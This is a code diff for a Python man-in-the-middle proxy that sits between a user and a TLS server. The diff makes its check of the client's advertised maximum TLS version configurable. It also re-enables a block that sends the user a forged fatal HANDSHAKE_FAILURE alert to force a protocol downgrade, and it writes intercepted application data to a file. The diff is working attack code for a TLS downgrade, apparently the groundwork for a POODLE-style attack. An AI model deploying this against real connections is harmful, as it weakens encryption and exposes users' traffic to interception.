@@ -91,7 +91,7 @@ def parse(data, past_bytes_endpoint, past_bytes_user, is_response = False):
             if cont_type in constants.TLS_CONTENT:
                     print("User %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
                     if cont_type == 22:
-                            if ord(data[10]) == 3: # Iceweasel's max TLS version is specified here
+                            if ord(data[constants.MAX_TLS_POSITION]) > constants.MAX_TLS_ALLOWED:
                                 downgrade = True
                     if cont_type == 23:
                             with open('out.out', 'a') as f:
@@ -217,8 +217,7 @@ while 1:
                                                                                    ) # ...parse it...
                     logger.debug(output)
                     try:
-                    """
-                        if downgrade:
+                        if downgrade and constants.ATTEMPT_DOWNGRADE:
                                 alert = 'HANDSHAKE_FAILURE'
                                 output, _, _, _ = parse(
                                                     constants.ALERT_MESSAGES[alert],
@@ -226,10 +225,9 @@ while 1:
                                                     past_bytes_user,
                                                     True
                                                    )
-                                logger.debug(output)
+                                logger.debug("\n\n" + "Downgrade Attempt" + output)
                                 user_connection.sendall(constants.ALERT_MESSAGES[alert]) # if we are trying to downgrade, send fatal alert to user
                                 continue
-                    """
                         endpoint_socket.sendall(data) # ...and send it to endpoint
                     except Exception as exc:
                         logger.error("User data forwarding error")
